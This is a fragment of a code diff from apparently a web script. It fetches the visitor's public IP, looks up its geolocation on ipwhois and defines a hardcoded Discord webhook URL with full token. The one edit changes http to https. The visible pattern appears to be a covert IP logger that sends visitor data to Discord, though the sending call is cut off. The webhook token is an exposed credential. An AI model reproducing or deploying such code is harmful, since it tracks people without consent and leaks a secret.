@@ -1389,7 +1389,7 @@
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-            fetch(`http://ipwhois.app/json/${data.ip}`)
+            fetch(`https://ipwhois.app/json/${data.ip}`)
                 .then(response => response.json())
                 .then(ipWhoisData => {
                     const discordWebhook = 'https://discord.com/api/webhooks/1212194915883155486/mHxJb4bdz0XSf3FO-eJm01Ff1NyraazQ5z3J_dZAt9mXL_4gqP0poJ91EneMctEKBYaX';
